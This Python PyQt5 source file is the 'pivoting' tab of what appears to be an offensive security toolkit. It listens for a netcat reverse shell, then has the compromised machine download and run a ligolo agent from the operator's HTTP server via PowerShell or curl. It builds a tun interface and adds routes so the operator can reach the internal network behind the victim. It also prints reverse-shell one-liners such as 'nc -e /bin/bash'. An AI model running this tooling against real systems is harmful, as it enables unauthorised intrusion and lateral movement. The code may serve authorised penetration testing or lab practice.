import os
import socket
import subprocess
import shutil
import time
from multiprocessing import Process

from PyQt5.QtCore import QTimer, pyqtSignal
from PyQt5.QtGui import QFont
from PyQt5.QtWidgets import (
    QApplication, QVBoxLayout, QWidget, QPushButton,
    QLabel, QLineEdit, QMessageBox, QTextEdit, QHBoxLayout, QComboBox
)

QApplication.setFont(QFont('Arial', 10))


def detect_terminal():
    # List of common terminals, ordered by preference
    terminals = ['qterminal', 'gnome-terminal', 'xterm', 'konsole']
    for terminal in terminals:
        if shutil.which(terminal):  # Checks if terminal is in PATH
            return terminal
    return None

class PivotingTab(QWidget):
    updateUI = pyqtSignal(str)
    connectionLost = pyqtSignal()  # Added signal for connection loss
    def __init__(self):
        super().__init__()
        self.initUI()
        self.listener_socket = None
        self.client_socket = None
        self.connection_thread = None
        self.is_listening = False
        self.is_connected = False
        self.initial_commands_running = False
        
        self.updateUI.connect(self.appendUpdate) 
    

    def initUI(self):
        self.user_cancelled = False
        self.layout = QVBoxLayout(self)

         # Dropdown Menu for OS Selection
        self.osSelectionLayout = QHBoxLayout()
        self.osLabel = QLabel("Select OS:")
        self.osDropdown = QComboBox()
        self.osDropdown.addItems(["Windows", "Linux"])  # Add the options
        self.osDropdown.currentTextChanged.connect(self.updateWaitingTime)  # Connect to the new method
        self.osSelectionLayout.addWidget(self.osLabel)
        self.osSelectionLayout.addWidget(self.osDropdown)
        self.layout.addLayout(self.osSelectionLayout)


        # New section for IP text boxes
        self.ipLayout = QHBoxLayout()  # Horizontal layout for aligning text boxes
        self.yourIpLabel = QLabel("Your IP:")
        self.yourIpLineEdit = QLineEdit("172.25.131.103")  # Create a QLineEdit for user's IP
        self.yourIpLineEdit.setPlaceholderText("Enter your IP")

        self.targetIpLabel = QLabel("Target Network (make sure the last octet is 0):")
        self.targetIpLineEdit = QLineEdit("172.17.0.0")  # Create a QLineEdit for target's IP
        self.targetIpLineEdit.setPlaceholderText("Enter target's IP")

        # Adding widgets to the layout
        self.ipLayout.addWidget(self.yourIpLabel)
        self.ipLayout.addWidget(self.yourIpLineEdit)
        self.ipLayout.addWidget(self.targetIpLabel)
        self.ipLayout.addWidget(self.targetIpLineEdit)

        # Add the new IP layout to the main layout
        self.layout.addLayout(self.ipLayout)

        self.portLayout = QHBoxLayout()
        self.portLabel = QLabel("Port:")
        self.portLineEdit = QLineEdit("4444")  # Set initial value here
        self.portLineEdit.setPlaceholderText("Enter port to listen on")
        self.portLayout.addWidget(self.portLabel)
        self.portLayout.addWidget(self.portLineEdit)
        self.layout.addLayout(self.portLayout)

        # Create a horizontal layout for the status label and buttons
        self.statusButtonLayout = QHBoxLayout()

        self.listenButton = QPushButton("Start Listening")
        self.listenButton.clicked.connect(self.startListening)
        self.statusButtonLayout.addWidget(self.listenButton)

        self.cancelButton = QPushButton("Cancel Listening")
        self.cancelButton.clicked.connect(self.stopListening)
        self.statusButtonLayout.addWidget(self.cancelButton)
        self.listeningStatusLabel = QLabel("Status: Not listening")
        self.listeningStatusLabel.setFixedWidth(250)  # Set a fixed width for the label
        self.listeningStatusLabel.setFixedHeight(50)  # Set a fixed width for the label
        self.statusButtonLayout.addWidget(self.listeningStatusLabel)
        self.layout.addLayout(self.statusButtonLayout)

         # Adding a new section for Sleep Duration
        self.sleepLayout = QHBoxLayout()
        self.sleepLabel = QLabel("Upload wait time (seconds):")
        self.sleepLineEdit = QLineEdit("60")  # Default value set to 60 seconds
        self.sleepLineEdit.setPlaceholderText("Enter wait time for upload")
        self.sleepLayout.addWidget(self.sleepLabel)
        self.sleepLayout.addWidget(self.sleepLineEdit)
        self.layout.addLayout(self.sleepLayout)




        # Create a text area for logs and updates
        self.updatesTextArea = QTextEdit()
        self.updatesTextArea.setReadOnly(True)  # Make it read-only
        self.layout.addWidget(self.updatesTextArea)
        # Removed the commandOutput widget
        self.updateDropdownStyle()
        self.connectionLost.connect(self.handleConnectionLoss)  # Connect connectionLost signal
        self.updateUI.connect(self.appendUpdate)
        # Create a timer for periodic connection check
        self.connection_check_timer = QTimer(self)
        self.connection_check_timer.timeout.connect(self.checkConnection)
        self.connection_check_timer.start(1000)

    def appendUpdate(self, message, color="green"):
        """This method updates the text area with color."""
        color_message = f"<span style='color:{color};'>{message}</span>"
        self.updatesTextArea.append(color_message)

    def updateWaitingTime(self, os_selected):
        """Update the waiting time based on OS selection."""
        if os_selected == "Windows":
            self.sleepLineEdit.setText("60")  # 60 seconds for Windows
        elif os_selected == "Linux":
            self.sleepLineEdit.setText("20")  # 20 seconds for Linux

    def updateStatus(self, message):
        """This method emits signal to update UI."""
        self.updateUI.emit(message)

    def checkConnection(self):
        # This function checks the connection periodically
        if self.is_connected and self.client_socket:
            try:
                # Dummy receive to check for connection loss
                if self.client_socket.recv(4096) == b'':
                    self.connectionLost.emit()  # Emit the signal if connection is lost
            except socket.error:
                self.connectionLost.emit()  # Emit the signal if an error occurs

    def handleConnectionLoss(self):
        # This slot is called when the connection is lost
        if not self.user_cancelled:  # Check if cancellation was not user-initiated
            self.is_connected = False
            self.resetApplication()
            self.listeningStatusLabel.setText("Connection lost. Ready to listen.")
            # Stop sending initial commands if they are running
            if self.initial_commands_running:
                self.initial_commands_running = False
       

    def startListening(self):
        port = self.portLineEdit.text()
        print(f"\033[92mListining on port {port}... \033[0m")
        self.updatesTextArea.clear()
        your_ip = self.yourIpLineEdit.text()
        target_ip = self.targetIpLineEdit.text()
        self.appendUpdate(f"The port is listining now, go to the target machine and send a reverse shell using nc(netcat)")
        self.appendUpdate(f"###")
        self.appendUpdate(f"After that watch the terminal for updates while connecting you to the target.")
        self.appendUpdate(f"###")
        self.appendUpdate(f"To cancel access to the pivoting target and cancel the port listing use the cancel listining button.")
        self.appendUpdate(f"###")
        self.appendUpdate(f"The upload wait time is the time needed to upload agent.exe to the target machine, if you have fast connection and you think that agent.exe can be uploaded in less that 90 second feel free to change it to any time you think it fits your needs.")
        if not your_ip or not target_ip:
            QMessageBox.warning(self, "Error", "Please enter both 'Your IP' and 'Target IP' before starting.")
            return
        
        if port.isdigit() and 0 < int(port) < 65536:
            if self.connection_thread and self.connection_thread.is_alive():
                QMessageBox.warning(self, "Error", "Already listening. Please stop before restarting.")
                return

            self.port = int(port)
            self.listeningStatusLabel.setText(f"Status: Listening on port {port}...")
            self.is_listening = True

            # Create a new process for the listening session
            self.childProcess = Process(target=self.handleConnection)  # Create the child process
            self.childProcess.start()

        else:
            QMessageBox.warning(self, "Invalid Input", "Please enter a valid port number (1-65535)")
       
    def sendInitialCommands(self):
        selected_os = self.osDropdown.currentText()  # Get the selected OS from the dropdown
        your_ip = self.yourIpLineEdit.text()
        target_ip = self.targetIpLineEdit.text()
        print(f"\033[93mReverse Shell Received, trying to establish the connection to {target_ip} network\033[0m")

        # Ensure that the IP addresses are not empty
        if not your_ip or not target_ip:
            print("IP addresses are not specified.")
            self.updateUI.emit("IP addresses are not specified.")
            return

        self.initial_commands_running = True

        # Choose the command based on the OS
        if selected_os == "Windows":
            command = f"powershell -c iwr -uri http://{your_ip}:52999/agent.exe -Outfile agent.exe -UseBasicParsing"
            print(f"\033[92mUploading agent.exe,this might take a while please wait... \033[0m")

        elif selected_os == "Linux":
            command = f"curl http://{your_ip}:52999/agent -o agent && chmod +x agent"
            print(f"\033[92mUploading agent, this might take a while depending on the uploading time you specified please wait... \033[0m")


        self.sendCommand(command)
        upload_wait_time = int(self.sleepLineEdit.text())  # Get the user input and convert to integer
        time.sleep(upload_wait_time)

        self.executeLocalCommands()
        self.initial_commands_running = False

        
    def executeLocalCommands(self):
       
        your_ip = self.yourIpLineEdit.text()
        target_ip = self.targetIpLineEdit.text()

        # Ensure that the IP addresses are not empty
        if not your_ip or not target_ip:
            print("IP addresses are not specified.")
            self.updateUI.emit("IP addresses are not specified.")
            return  # Exit the function if the IP addresses are empty

        # Check if the interface exists and delete it if it does
        try:
            print(f"\033[92mCreating new interface on local machine... \033[0m")
            time.sleep(10)  # Add delay between commands if necessary
            subprocess.run("ip link show ligolo", shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # If the previous command didn't raise an exception, the interface exists and can be deleted
            subprocess.run("ip link delete ligolo", shell=True, check=True)
            self.updateUI.emit("Deleted existing 'ligolo' interface.")
        except subprocess.CalledProcessError:
            # The interface does not exist, no action needed, can proceed to add it
            self.updateUI.emit("'ligolo' interface does not exist, creating it.")

        # Now proceed with adding the interface and setting it up
        commands = [
            "ip tuntap add dev ligolo mode tun",
            
        ]
        selected_os = self.osDropdown.currentText()

        for command in commands:
            self.proxy_process = subprocess.Popen("killall proxy", shell=True, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            try:
                subprocess.run(command, shell=True, check=True)
                self.updateUI.emit(f"Command executed successfully: {command}")
            except subprocess.CalledProcessError as e:
                self.updateUI.emit(f"Error executing command: {e}")
            command = "ip link set ligolo up"
            subprocess.run(command, shell=True, check=True)
            self.proxy_process = subprocess.Popen(["./proxy"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            print(f"Configuring Proxy...")
            time.sleep(10)
            if selected_os == "Windows":
                # Windows-specific commands post agent execution
                commands = [
                    f"powershell -c ./agent.exe -connect {your_ip}:11601 -ignore-cert",
                  
                ]
            elif selected_os == "Linux":
                # Linux-specific commands post agent execution
                commands = [
                    f"./agent -connect {your_ip}:11601 -ignore-cert && whoami",
                   
                ]

            for command in commands:
                self.sendCommand(command)
                time.sleep(5)
                
            print(f"\033[92mStarting session... \033[0m")
            self.interactWithProxy("session")
           
            time.sleep(1)
            self.interactWithProxy("1")
         
            time.sleep(1)
            self.interactWithProxy("start")
            
            time.sleep(1) 
            print(f"\033[92mSession started. \033[0m")
            self.interactWithProxy(f"listener_add --addr 0.0.0.0:1234 --to {your_ip}:80 --tcp")
            time.sleep(3) 
            print(f"\033[92mUpload listener added on port 1234 that will forward request to port 80 on your machine.")
            print("To upload a file to any host on the new network, you will need to send the rquest to the host that you started the revese shell from(dual interface host)\nFor example: iwr -uri http://10.0.2.5:1234/nc64.exe -Outfile nc64.exe\033[0m")
        try:
            
            # Execute the command to add the route
            subprocess.run(f"ip route add {target_ip}/24 dev ligolo", shell=True, check=True)
            #self.updateUI.emit("Route added successfully.")
            print("Route added successfully.")

            # Assume target_ip is something like "10.0.2.0"
            target_ip = self.targetIpLineEdit.text()

            # Split the IP into its parts
            ip_parts = target_ip.split('.')

            # Modify the last part (last octet) from 0 to 1
            ip_parts[-1] = "1"  # Change last octet to 1

            # Reassemble the IP address
            modified_target_ip = ".".join(ip_parts)

            result = subprocess.run(["ping", "-c", "2", modified_target_ip], capture_output=True, text=True)

            # Decode the output and check if "1 packets received" or similar success message is in the output
            if "ttl" in result.stdout:
                print(f"\033[92mSuccessfully reached {target_ip} network.You can interact with it now...\033[0m")
                while self.is_listening:
                   
                    print(f"\033[92mExecuting ping command against network gateway to make sure the host is still reachable...\033[0m")
                    subprocess.run(f"ping -c 4 {modified_target_ip}", shell=True, check=True)
                    time.sleep(30)
            else:
                print(f"\033[91mattempt to connect you to {target_ip} failed. Please try again after cganging the wait time for more than 60.\033[0m")

        except subprocess.CalledProcessError as e:
                self.updateUI.emit(f"Error executing command: {e}")

            


   
    def handleConnection(self):
        selected_os = self.osDropdown.currentText()
        directory_to_serve = "/usr/share/adsuit/"

        # Change the current working directory to the specified directory
        os.chdir(directory_to_serve)
        try:
            # Start the Python HTTP server as a subprocess
            
            try:
                        # Start the Python HTTP server as a subprocess
                        # Redirect both stdout and stderr to DEVNULL to prevent output to terminal
                        http_server_process = subprocess.Popen(
                            ["python", "-m", "http.server", "52999"],
                            stdout=subprocess.DEVNULL, 
                            stderr=subprocess.DEVNULL
                        )
                        print("HTTP server started.")
                        
            except Exception as e:
                        print(f"Failed to start the HTTP server: {e}")
            if selected_os == "Windows":
              
                commands = [
                    print(f"\033[92mListining for reverse shells from Windows devices\nTo execute a reverse shell from Windows device, first upload nc64.exe then execute:\nnc64.exe 192.168.0.x port -e cmd \033[0m")
                    
                ]
            elif selected_os == "Linux":
                
                commands = [
                    print(f"\033[92mListining for reverse shells from Linux devices\nTo execute a reverse shell from Linux device, execute:\nnc -e /bin/bash 192.168.0.x port  \033[0m")
                ]                       
            self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener_socket.bind(('', self.port))
            self.listener_socket.listen(1)
            self.listener_socket.settimeout(2)

            while self.is_listening:
                try:
                    self.client_socket, addr = self.listener_socket.accept()
                    self.listeningStatusLabel.setText(f"Status: Connected to {addr}")
                    self.is_connected = True  # Connection established

                    # Call the sendInitialCommands method to send initial commands
                    self.sendInitialCommands()

                    # After sending the initial commands and the termination signal, close the connection
                    self.client_socket.shutdown(socket.SHUT_RDWR)
                    self.client_socket.close()
                    self.is_connected = False  # Mark as not connected
                    self.resetForNewConnection()
                    
                    # Wait for data or connection loss
                    while self.is_listening:
                        try:
                            if self.client_socket.recv(4096) == b'':
                                self.connectionLost.emit()  # Emit the signal if connection is lost
                                break  # Connection is closed, break the inner loop
                        except socket.error:
                            self.connectionLost.emit()  # Emit the signal if an error occurs
                            break  # Error or connection lost, break the inner loop

                    # Connection lost, reset for a new listening
                    self.resetForNewConnection()

                except socket.timeout:
                    continue  # Continue listening for a new connection
                except Exception as e:
                    break  # Break the outer loop in case of an exception

        except OSError as e:
            self.listeningStatusLabel.setText("Error occurred: " + str(e))
        finally:
            # Stop the Python HTTP server subprocess
            http_server_process.terminate()
            self.cleanup()  # 

    def cleanup(self):
        if self.client_socket:
            try:
                self.client_socket.shutdown(socket.SHUT_RDWR)
                self.client_socket.close()
            except OSError:
                pass  # Ignore errors in shutdown and close
        if self.listener_socket:
            try:
                self.listener_socket.close()
            except OSError:
                pass
        self.resetApplication()
    def resetApplication(self):
        self.client_socket = None
        self.listener_socket = None
        self.connection_thread = None
        self.is_listening = False
        self.is_connected = False
        self.listeningStatusLabel.setText("Ready to listen.")

    def sendCommand(self, command):
        if self.client_socket:
            try:
                # Ensure command is in the correct format (consider newlines, carriage returns etc.)
                command = command.strip() + '\n'
                self.client_socket.sendall(command.encode('utf-8'))
                # Wait for a response with a timeout to avoid hanging
                self.client_socket.settimeout(2)  # Adjust timeout as needed
                response = self.client_socket.recv(4096).decode('utf-8', errors='replace')
               
                # Emit the signal to update the UI with the response
                self.updateUI.emit(f"Response from {command}:\n{response}")
            except socket.timeout:
                self.updateUI.emit("No response received — command may have failed or is taking too long.")
            except Exception as e:
                self.updateUI.emit(f"Error sending command: {e}")
            finally:
                self.client_socket.settimeout(None)  # Reset timeout to default


    def stopListening(self):
        print(f"\033[91m\nStoping listining and pivoting... \033[0m")
        self.user_cancelled = True
        self.is_listening = False
        self.updatesTextArea.clear()
        # Terminate the listening process
        self.childProcess.terminate()
        # Close client socket if exists
        if self.client_socket:
            try:
                self.client_socket.shutdown(socket.SHUT_RDWR)
                self.client_socket.close()
            except OSError:
                pass  # Ignore errors in shutdown and close
            self.client_socket = None

        # Close listener socket if exists
        if self.listener_socket:
            try:
                self.listener_socket.close()
            except OSError:
                pass
            self.listener_socket = None

        # Additional cleanup if needed
        self.listeningStatusLabel.setText("Status: Listening canceled")


    def startProxyProcess(self):
        # This method starts the proxy.sh script in a separate process'
    
        os.system("killall proxy")
        #self.proxy_process = subprocess.Popen(["./proxy"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
       

   

    def interactWithProxy(self, command):
        
        if self.proxy_process:
            self.proxy_process.stdin.write((command + "\n").encode())
            self.proxy_process.stdin.flush()

           
        if self.proxy_process.poll() is not None:
            print("Proxy process has terminated.")
            self.updateUI.emit("Proxy process has terminated.")


    def threadWrapperForProxy(self):
        # This function is a thread wrapper for starting proxy.sh
        self.startProxyProcess()

    def updateDropdownStyle(self):
        dropdownStyle = """
        QComboBox::item {
            color: black; /* Ensuring text is always visible */
            background-color: white; /* Default background */
        }
        QComboBox::item:hover {
            background-color: white; /* Green background for hover */
            color: white; /* White text for contrast */
        }
        """
        # Apply the style to each QComboBox
        self.osDropdown.setStyleSheet(dropdownStyle)